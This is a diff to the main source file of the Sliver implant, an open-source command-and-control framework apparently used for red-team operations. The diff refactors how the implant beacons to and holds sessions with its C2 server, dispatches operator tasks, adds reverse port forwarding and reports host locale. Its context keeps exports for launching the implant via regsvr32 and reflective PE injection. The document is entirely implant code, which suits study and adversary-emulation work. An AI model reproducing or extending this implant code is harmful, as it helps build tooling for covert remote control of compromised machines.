@@ -25,9 +25,8 @@ import "C"
 // {{end}}
 
 import (
-	"crypto/rand"
-	"encoding/binary"
-	"log"
+	"errors"
+
 	insecureRand "math/rand"
 	"os"
 	"os/user"
@@ -38,20 +37,15 @@ import (
 	"sync"
 	// {{end}}
 
-	// {{if .Config.Debug}}{{else}}
-	"io/ioutil"
-	// {{end}}
-
-	// {{if eq .Config.GOOS "windows"}}
-	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"github.com/bishopfox/sliver/implant/sliver/syscalls"
-
+	// {{if .Config.Debug}}
+	"log"
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
+	"github.com/bishopfox/sliver/implant/sliver/locale"
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
@@ -67,25 +61,12 @@ import (
 )
 
 var (
-	InstanceID string
-
-	c2Servers = []string{
-		// {{range $index, $value := .Config.C2}}
-		"{{$value}}", // {{$index}}
-		// {{end}}
-	}
-
+	InstanceID       string
 	connectionErrors = 0
+	ErrTerminate     = errors.New("terminate")
 )
 
 func init() {
-	buf := make([]byte, 8)
-	n, err := rand.Read(buf)
-	if err != nil || n != len(buf) {
-		binary.LittleEndian.PutUint64(buf, uint64(time.Now().Unix()))
-	}
-	insecureRand.Seed(int64(binary.LittleEndian.Uint64(buf)))
-
 	id, err := uuid.NewV4()
 	if err != nil {
 		buf := make([]byte, 16) // NewV4 fails if secure rand fails
@@ -105,25 +86,11 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			abort := make(chan struct{})
-			connections := transports.StartConnectionLoop(c2Servers, abort)
-			for connection := range connections {
-				if connection == nil {
-					break
-				}
-				err := sessionMainLoop(connection)
-				if err != nil {
-					connectionErrors++
-					if transports.GetMaxConnectionErrors() < connectionErrors {
-						return
-					}
-				}
-				reconnect := transports.GetReconnectInterval()
-				// {{if .Config.Debug}}
-				log.Printf("Reconnect sleep: %s", reconnect)
-				// {{end}}
-				time.Sleep(reconnect)
-			}
+			// {{if .Config.IsBeacon}}
+			beaconStartup()
+			// {{else}}
+			sessionStartup()
+			// {{end}}
 		case c := <-r:
 			switch c.Cmd {
 			case svc.Interrogate:
@@ -147,6 +114,7 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 var isRunning bool = false
 
 // StartW - Export for shared lib build
+//
 //export StartW
 func StartW() {
 	if !isRunning {
@@ -159,21 +127,25 @@ func StartW() {
 //https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
 
 // VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//
 //export VoidFunc
 func VoidFunc() { main() }
 
 // DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//
 //export DllInstall
 func DllInstall() { main() }
 
 // DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//
 //export DllRegisterServer
 func DllRegisterServer() { main() }
 
 // DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//
 //export DllUnregisterServer
 func DllUnregisterServer() { main() }
 
@@ -183,9 +155,15 @@ func main() {
 
 	// {{if .Config.Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
+	debugFilePath := "{{ .Config.DebugFile }}"
+	if debugFilePath != "" {
+		// Open the log file for writing
+		file, err := os.OpenFile(debugFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
+		if err == nil {
+			log.SetOutput(file)
+		}
+	}
 	// {{else}}
-	log.SetFlags(0)
-	log.SetOutput(ioutil.Discard)
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -199,7 +177,16 @@ func main() {
 	// {{else}}
 
 	// {{if .Config.IsBeacon}}
+	beaconStartup()
+	// {{else}} ------- IsBeacon/IsSession -------
+	sessionStartup()
+	// {{end}}
 
+	// {{end}} ------- IsService -------
+}
+
+// {{if .Config.IsBeacon}}
+func beaconStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
@@ -207,7 +194,7 @@ func main() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	beacons := transports.StartBeaconLoop(c2Servers, abort)
+	beacons := transports.StartBeaconLoop(abort)
 	for beacon := range beacons {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
@@ -227,9 +214,11 @@ func main() {
 		// {{end}}
 		time.Sleep(reconnect)
 	}
+}
 
-	// {{else}} ------- IsBeacon/IsSession -------
+// {{else}}
 
+func sessionStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
 	// {{end}}
@@ -237,11 +226,15 @@ func main() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	connections := transports.StartConnectionLoop(c2Servers, abort)
+	connections := transports.StartConnectionLoop(abort)
 	for connection := range connections {
 		if connection != nil {
 			err := sessionMainLoop(connection)
 			if err != nil {
+				if err == ErrTerminate {
+					connection.Cleanup()
+					return
+				}
 				connectionErrors++
 				if transports.GetMaxConnectionErrors() < connectionErrors {
 					return
@@ -254,10 +247,9 @@ func main() {
 		// {{end}}
 		time.Sleep(reconnect)
 	}
-	// {{end}}
-
-	// {{end}}
 }
+
+// {{end}}
 
 // {{if .Config.IsBeacon}}
 func beaconMainLoop(beacon *transports.Beacon) error {
@@ -302,25 +294,32 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
 		Register:    register,
-		NextCheckin: nextCheckin.UTC().Unix(),
+		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
-	beacon.Close()
 	time.Sleep(time.Second)
+	beacon.Close()
 
 	// BeaconMain - Is executed in it's own goroutine as the function will block
 	// until all tasks complete (in success or failure), if a task handler blocks
 	// forever it will simply block this set of tasks instead of the entire beacon
 	errors := make(chan error)
+	shortCircuit := make(chan struct{})
 	for {
 		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
 		go func() {
+			oldInterval := beacon.Interval()
 			err := beaconMain(beacon, nextCheckin)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] main error: %v", nextCheckin)
 				// {{end}}
 				errors <- err
+			} else if oldInterval != beacon.Interval() {
+				// The beacon's interval was modified so we need to short circuit
+				// the current sleep and tell the server when the next checkin will
+				// be based on the new interval.
+				shortCircuit <- struct{}{}
 			}
 		}()
 
@@ -331,6 +330,8 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-errors:
 			return err
 		case <-time.After(duration):
+		case <-shortCircuit:
+			// Short circuit current duration with no error
 		}
 	}
 	return nil
@@ -348,6 +349,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] closing ...")
 		// {{end}}
+		time.Sleep(time.Second)
 		beacon.Close()
 	}()
 	// {{if .Config.Debug}}
@@ -355,7 +357,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{end}}
 	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          InstanceID,
-		NextCheckin: nextCheckin.UTC().Unix(),
+		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -395,13 +397,50 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		return nil
 	}
 
+	var tasksExtensionRegister []*sliverpb.Envelope
+	var tasksOther []*sliverpb.Envelope
+
+	for _, task := range tasks.Tasks {
+		switch task.Type {
+		case sliverpb.MsgRegisterExtensionReq:
+			tasksExtensionRegister = append(tasksExtensionRegister, task)
+		default:
+			tasksOther = append(tasksOther, task)
+		}
+	}
+
+	// ensure extensions are registered before they are called
+	var results []*sliverpb.Envelope
+	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
+		results = append(results, r)
+	}
+	for _, r := range beaconHandleTasklist(tasksOther) {
+		results = append(results, r)
+	}
+
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+		ID:    InstanceID,
+		Tasks: results,
+	}))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] error sending results %s", err)
+		// {{end}}
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] all results sent to server, cleanup ...")
+	// {{end}}
+	return nil
+}
+
+func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
-	specHandlers := handlers.GetSpecialHandlers()
+	specHandlers := handlers.GetKillHandlers()
 
-	for _, task := range tasks.Tasks {
+	for _, task := range tasks {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] execute task %d", task.Type)
 		// {{end}}
@@ -409,21 +448,43 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 			wg.Add(1)
 			data := task.Data
 			taskID := task.ID
-			go handler(data, func(data []byte, err error) {
-				resultsMutex.Lock()
-				defer resultsMutex.Unlock()
+			// {{if eq .Config.GOOS "windows" }}
+			go func() {
 				defer wg.Done()
-				// {{if .Config.Debug}}
-				if err != nil {
-					log.Printf("[beacon] handler function returned an error: %s", err)
-				}
-				log.Printf("[beacon] task completed (id: %d)", taskID)
-				// {{end}}
-				results = append(results, &sliverpb.Envelope{
-					ID:   taskID,
-					Data: data,
+				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
+					resultsMutex.Lock()
+					defer resultsMutex.Unlock()
+					// {{if .Config.Debug}}
+					if err != nil {
+						log.Printf("[beacon] handler function returned an error: %s", err)
+					}
+					log.Printf("[beacon] task completed (id: %d)", taskID)
+					// {{end}}
+					results = append(results, &sliverpb.Envelope{
+						ID:   taskID,
+						Data: data,
+					})
 				})
-			})
+			}()
+			//  {{else}}
+			go func() {
+				defer wg.Done()
+				handler(data, func(data []byte, err error) {
+					resultsMutex.Lock()
+					defer resultsMutex.Unlock()
+					// {{if .Config.Debug}}
+					if err != nil {
+						log.Printf("[beacon] handler function returned an error: %s", err)
+					}
+					log.Printf("[beacon] task completed (id: %d)", taskID)
+					// {{end}}
+					results = append(results, &sliverpb.Envelope{
+						ID:   taskID,
+						Data: data,
+					})
+				})
+			}()
+			// {{end}}
 		} else if task.Type == sliverpb.MsgOpenSession {
 			go openSessionHandler(task.Data)
 			resultsMutex.Lock()
@@ -444,6 +505,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 			resultsMutex.Unlock()
 		}
 	}
+
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] waiting for task(s) to complete ...")
 	// {{end}}
@@ -452,19 +514,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
-		ID:    InstanceID,
-		Tasks: results,
-	}))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[beacon] error sending results %s", err)
-		// {{end}}
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] all results sent to server, cleanup ...")
-	// {{end}}
-	return nil
+	return results
 }
 
 func openSessionHandler(data []byte) {
@@ -475,9 +525,7 @@ func openSessionHandler(data []byte) {
 		log.Printf("[beacon] failed to parse open session msg: %s", err)
 		// {{end}}
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] open session -> %v", openSession.C2S)
-	// {{end}}
+
 	if openSession.Delay != 0 {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
@@ -487,13 +535,17 @@ func openSessionHandler(data []byte) {
 
 	go func() {
 		abort := make(chan struct{})
-		connections := transports.StartConnectionLoop(openSession.C2S, abort)
+		connections := transports.StartConnectionLoop(abort, openSession.C2S...)
 		defer func() { abort <- struct{}{} }()
 		connectionAttempts := 0
 		for connection := range connections {
 			connectionAttempts++
 			if connection != nil {
 				err := sessionMainLoop(connection)
+				if err == ErrTerminate {
+					connection.Cleanup()
+					return
+				}
 				if err == nil {
 					break
 				}
@@ -514,18 +566,18 @@ func openSessionHandler(data []byte) {
 // {{end}} -IsBeacon
 
 func sessionMainLoop(connection *transports.Connection) error {
+	if connection == nil {
+		// {{if .Config.Debug}}
+		log.Printf("[session] nil connection!")
+		// {{end}}
+		return nil
+	}
 	err := connection.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[session] failed to establish connection: %s", err)
 		// {{end}}
 		return err
-	}
-	if connection == nil {
-		// {{if .Config.Debug}}
-		log.Printf("[session] nil connection!")
-		// {{end}}
-		return nil
 	}
 	pivots.RestartAllListeners(connection.Send)
 	defer pivots.StopAllListeners()
@@ -542,17 +594,24 @@ func sessionMainLoop(connection *transports.Connection) error {
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
-	specialHandlers := handlers.GetSpecialHandlers()
+	specialHandlers := handlers.GetKillHandlers()
+	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
 	for envelope := range connection.Recv {
-		if handler, ok := specialHandlers[envelope.Type]; ok {
+		envelope := envelope
+		if _, ok := specialHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
-			handler(envelope.Data, connection)
+			return ErrTerminate
 		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)
+		} else if handler, ok := rportfwdHandlers[envelope.Type]; ok {
+			// {{if .Config.Debug}}
+			log.Printf("[recv] rportfwdHandler with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
@@ -562,20 +621,23 @@ func sessionMainLoop(connection *transports.Connection) error {
 			// only applies the token to the calling thread, we need to call it before every task.
 			// It's fucking gross to do that here, but I could not come with a better solution.
 
-			// {{if eq .Config.GOOS "windows" }}
-			if priv.CurrentToken != 0 {
-				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
-				if err != nil {
-					// {{if .Config.Debug}}
-					log.Printf("Error: %v\n", err)
-					// {{end}}
-				}
-			}
-			// {{end}}
-
 			// {{if .Config.Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
+
+			// {{if eq .Config.GOOS "windows" }}
+			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
+				// {{if .Config.Debug}}
+				if err != nil {
+					log.Printf("[session] handler function returned an error: %s", err)
+				}
+				// {{end}}
+				connection.Send <- &sliverpb.Envelope{
+					ID:   envelope.ID,
+					Data: data,
+				}
+			})
+			// {{else}}
 			go handler(envelope.Data, func(data []byte, err error) {
 				// {{if .Config.Debug}}
 				if err != nil {
@@ -587,6 +649,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 					Data: data,
 				}
 			})
+			// {{end}}
 		} else if handler, ok := tunHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] tunHandler %d", envelope.Type)
@@ -679,5 +742,6 @@ func registerSliver() *sliverpb.Register {
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
 		ConfigID:          "{{ .Config.ID }}",
 		PeerID:            pivots.MyPeerID,
+		Locale:            locale.GetLocale(),
 	}
 }
